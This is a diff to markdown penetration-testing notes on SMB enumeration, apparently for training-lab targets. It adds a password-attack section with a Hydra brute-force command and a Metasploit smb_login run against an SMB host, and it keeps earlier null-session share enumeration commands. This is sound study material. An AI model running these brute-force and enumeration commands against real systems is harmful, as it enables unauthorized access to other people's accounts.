@@ -79,7 +79,7 @@ With version 3, the Samba server gained the ability to be a full member of an Ac
 
 - `samrdump.py 10.129.14.128`
 
-### Metasploit
+### Enum with Metasploit
 
 - `msfconsole`
 - `use auxiliary/scanner/smb/smb_version`
@@ -121,6 +121,23 @@ pip3 install -r requirements.txt
 
 - [Github repo](https://github.com/Porchetta-Industries/CrackMapExec)
 - `crackmapexec smb 10.129.14.128 --shares -u '' -p ''`
+
+### Password attack
+
+#### Hydra
+
+- `hydra -L user.list -P password.list smb://10.129.42.197`
+
+#### Pass attack with Metasploit
+
+```bash
+use auxiliary/scanner/smb/smb_login
+options
+set user_file user.list
+set pass_file password.list
+set rhosts 10.129.42.197
+run
+```
 
 ## What to try
 
